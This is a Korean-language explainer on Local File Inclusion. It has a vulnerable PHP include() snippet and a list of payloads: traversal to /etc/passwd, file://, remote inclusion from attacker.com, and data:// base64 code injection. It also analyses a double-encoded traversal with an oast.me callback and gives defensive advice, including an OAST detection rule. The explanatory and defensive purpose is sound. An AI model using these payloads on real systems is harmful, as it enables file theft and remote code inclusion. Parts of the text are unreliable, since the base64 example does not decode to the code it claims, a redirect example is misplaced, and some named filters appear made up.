### **LFI (Local File Inclusion) 취약점이란?**

**LFI (Local File Inclusion)** 취약점은 웹 애플리케이션이 사용자가 입력한 값을 처리할 때, 그 입력값을 **파일 경로로 해석**하여 서버의 파일을 읽도록 할 수 있는 취약점입니다. 주로 **PHP**에서 발생하며, 공격자는 서버의 로컬 파일을 포함시켜서 **비밀번호 파일**, **구성 파일**, 또는 심지어 **시스템 파일**에 접근할 수 있게 됩니다.

이 취약점이 발생하는 주된 이유는 사용자가 **파일 경로**를 입력하도록 하는 기능이 제대로 필터링되지 않거나, **입력값 검증**이 부족할 때입니다.(예. file_get_contents())


### **LFI 취약점이 발생하는 예시**

```php
<?php
  // 예시 코드
  $page = $_GET['page'];  // 사용자가 입력한 'page' 값
  include($page);         // 사용자가 지정한 파일을 포함
?>
```

위 코드에서 `$_GET['page']`는 사용자가 입력하는 **파일 경로**입니다. 예를 들어, 사용자가 `page=about.php`와 같이 요청을 보내면 `about.php` 파일이 포함됩니다. 문제는, 이 값이 **검증되지 않고** 바로 파일 경로로 처리되기 때문에 **악의적인 사용자가** 이를 이용하여 서버의 중요한 파일을 포함시킬 수 있습니다.


### **LFI 취약점의 악용 예시**

사용자가 URL에서 `page` 파라미터를 이용하여 다른 파일을 포함시키도록 할 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?page=../../../../etc/passwd
```

위의 예에서 `../../../../etc/passwd`는 **상위 디렉터리로 이동하여** 시스템의 중요한 파일인 **`/etc/passwd`** 파일을 포함하려는 시도입니다. `/etc/passwd` 파일은 리눅스 시스템에서 사용자 계정 정보가 담겨 있는 파일로, 이를 포함하면 공격자는 시스템에 대한 중요한 정보를 얻을 수 있습니다.



---


### **LFI 취약점의 페이로드 예시**


#### 1. **상위 디렉터리로 이동하여 민감한 파일 읽기**

```http
http://example.com/vulnerable.php?page=../../../../etc/passwd
```

* 위 URL은 시스템의 중요한 **`/etc/passwd`** 파일을 포함시키려는 시도입니다.


#### 2. **`file://`을 사용하여 로컬 파일 읽기**

```http
http://example.com/vulnerable.php?page=file:///etc/hosts
```

* `file://`을 사용하여 시스템의 **`/etc/hosts`** 파일을 포함할 수 있습니다. 이 파일은 시스템의 호스트 이름 및 IP 주소 정보를 담고 있습니다.


#### 3. **외부 웹 페이지의 파일 포함 (HTTP URL 사용)**

```http
http://example.com/vulnerable.php?page=http://attacker.com/malicious.php
```
* 참고 : 파일을 포함하지 않고 다른 페이지로의 리다이렉션을 원할 때는 다음과 같다.
```
https://example.com/school/?group=window.location=”https://maliciouswebsite.com”
```

* `http://`을 사용하여 **외부 서버**에서 악성 파일을 포함시킬 수 있습니다. 이 방법은 \*\*원격 파일 포함 (RFI)\*\*과 유사합니다.


#### 4. **PHP 코드 인젝션 (Wrapper + Base64)**

```http
http://example.com/vulnerable.php?page=data://text/plain;base64,PD9waHAgZWNobyAnSGVsbG8gd29ybGQnOyBmaW5hbCgpOyA/Pg==
```

* `data://` 프로토콜과 Base64 인코딩을 이용하여 PHP 코드를 직접 포함할 수 있습니다. 위 예시에서 `PD9waHAgZWNobyAnSGVsbG8gd29ybGQnOyBmaW5hbCgpOyA/Pg==`는 `<?php echo 'Hello world'; ?>`라는 PHP 코드를 Base64로 인코딩한 것입니다.


---

```
/npm-pwg/..;/axis2-AWC/services/listServices
```
는 두 가지 주요 기법이 결합된 것입니다.


## 🚨  디렉터리 트래버설 우회 시도 (`..;`)

* `..;/`는 **디렉터리 상위 이동 시도를 우회하기 위한 기법**입니다.
* 보통 `../`는 필터링되지만, `..;`처럼 **세미콜론(;)을 끼워넣는 방식**으로 필터를 우회하려는 것입니다.
* 서버 또는 웹 애플리케이션이 세미콜론 이후를 무시하고 처리하면, 실제로 `../axis2-AWC/services/listServices`처럼 처리될 수 있습니다.


---


```
/render/public/..%252f%255Cd26vk7hkvaoc75aqc1k01rpyo3cok4k7q.oast.me%252f%253F%252f..%252f..
```

는 **이중 인코딩(double‑encoded path‑traversal) + OAST out‑of‑band callback**을 결합한 공격 시도로 입니다.

### 🔍 경로의 주요 구조

1. **`..%252f` → `..%2f` → `../`**

   * `%252f`는 `%2f`(**/**)를 이중 인코딩한 형태입니다. 즉, 두 번 디코딩하면 실제 `"../"`가 됩니다.
   * 이 방식은 WAF가 `../` 필터링을 우회하도록 고안됐습니다 ([unsafe.sh][1], [GitHub][2]).

2. **`%255C` → `%5C` → `\`**

   * `%255C`는 `\`의 URL 인코딩(`%5C`)을 이중으로 인코딩한 경우입니다.
   * 일부 경로 처리 로직은 백슬래시(`\`)를 상위/하위 경로 구분 또는 우회 용도로 잘못 해석할 수 있으며, 이 역시 경로 변조에 사용될 수 있습니다.

3. **`d26vk7hkvaoc75aqc1k01rpyo3cok4k7q.oast.me`**

   * `*.oast.me` 도메인은 일반적인 사용자와 통신하는 서버(예: 로컬 웹 애플리케이션)가 URL을 통해 **외부 HTTP 호출** 또는 **DNS 해결**을 시도할 때, 공격자에게 알림을 보내기 위해 자동으로 생성되는 **OAST / Interact.sh out-of-band 콜백 도메인**입니다 ([Reddit][3]).



* 공격자는 **`../` 디렉터리 트래버설**을 이중 인코딩으로 우회하여 `/render/public/`의 외부 호스트(= `oast.me`) URL 부분을 경로 안에 삽입하려고 합니다.
* 만약 `/render/public/…` 내부 처리가 Java 템플릿에 포함되어 `File` 객체, `URL` 객체, 또는 SSRF/토템 플레이스홀더 등으로 변환되면, 서버가 **`oast.me` 도메인에 POST/GET/DNS 요청**을 시도하게 됩니다.
* 이렇게 되면 공격자는 “서버가 실제로 외부로 요청했는지” 여부를 알 수 있고, 이를 통해 **blind SSRF / server-side callback** 성공을 감지할 수 있습니다.


### ⚠️ 요약 및 주요 위험

| 항목            | 설명                                              |
| ------------- | ----------------------------------------------- |
| `..%252f...`  | 이중 인코딩된 `../` (디렉터리 트래버설 우회 시도)                 |
| `%255C`       | 백슬래시 사용한 경로 우회 / 플랫폼 의존 경로 조작                   |
| `oast.me` 도메인 | 공격자가 제어하는 OAST 도메인, 외부 요청 유도 → blind SSRF 여부 탐지 |
| 전체 목적         | WAF 우회 + 내부 템플릿 또는 파일 핸들러에 SSRF/URL 호출 유도       |


* **SSRF 가능성**

  * 서버가 `java.net.URL`, `FileInputStream`, `HttpURLConnection`, template placeholder 등과 같이 경로에 있는 URL을 실제 호출할 경우, 공격자의 OAST 서버로 요청이 전송됩니다.
  * DNS 레코드, HTTP GET, POST 요청까지 포함하여 다양한 방식으로 요청 유무가 수집될 수 있습니다.

* **경로 오염 / 정보 유출**

  * 디렉터리 트래버설이 작동할 경우, 로컬 환경 정보가 노출될 수도 있습니다.

* **WAF 필터링 우회**

  * `../`나 `\`를 둘러싼 filtering이 제대로 설계되지 않았다면, 단순한 필터링으로는 방어가 어렵습니다.

---

### ✅ 보안 권고 및 대응 방안

1. **WAF / 웹 서버에서 이중 인코딩 제거 + `../`, `%2e`, `%5B`, `%5C` 를 포함한 경로 차단 규칙 강화**

   * 예: `/render/` 이후 `/%25|%5C/` 또는 `\x2e\x2e` 등의 비표준 입력까지 처리하도록 정책 강화하십시오.

2. **경로 정규화 처리 전 필터링 적용**

   * 이중 인코딩된 문자열이 해제된 후 최종 `../`가 남는 경우에도 감지할 수 있도록 다단계 정규화를 적용하세요 ([raingray.com][4], [Medium][5]).

3. **OAST / Interact.sh 도메인 요청 탐지 규칙 포함**

   * 로그 또는 SIEM에 `*.oast.me`, `projectdiscovery.io`, `*.burpcollaborator.net` 등을 검색하는 탐지 룰을 설정해두세요 ([cloud.tencent.com][6]).

   예시 (Elasticsearch / Splunk SCM 룰):

   ```
   Domain: /\.oast\./ OR :.oastify\.com/ OR projectdiscovery\.io
   ```

4. **애플리케이션 템플릿/URL-handling 로직 검토**

   * 경로를 생성할 때 외부 리소스를 참조하지 않도록, 또는 URL fetch 이전에 도메인 화이트리스트 확인 절차를 넣으세요.
   * 경로 조작을 막기 위해, Java `URI.normalize()` 또는 `Paths.get(...).normalize()`를 사용하여 실제 파일 시스템 경로로 변환하기 전 검증 코드를 강화해야 합니다.

5. **로그 모니터링 및 IP 차단**

   * `/render/public/` 요청 내에 `/%25` 또는 `oast.me` 등이 포함된 요청 IP를 식별하여, 반복 시 차단 또는 알림 칸으로 격리하세요.

6. **표준 최신 취약점 대응 프레임워크 적용**

   * OWASP pattern filtering, Nginx `denyuri`, Lustre safe-browsing filter, reavor-phase filtering 등을 고려하십시오.



### 🎥 유사 사례 및 참고 인사이트

> “*.oast.*” OR “projectdiscovery.io” OR “\*.oastify.com”는 핑백 도메인 탐지 시 사용되는 보안 룰입니다. ([Reddit][7])
>
> “... 필터가 아직 `%2f`나 `%255c` 등 이중 인코딩된 문자열을 해제하지 못하거나, 순회 필터가 한 번만 적용되어 우회당할 수 있다.” ([Medium][5])

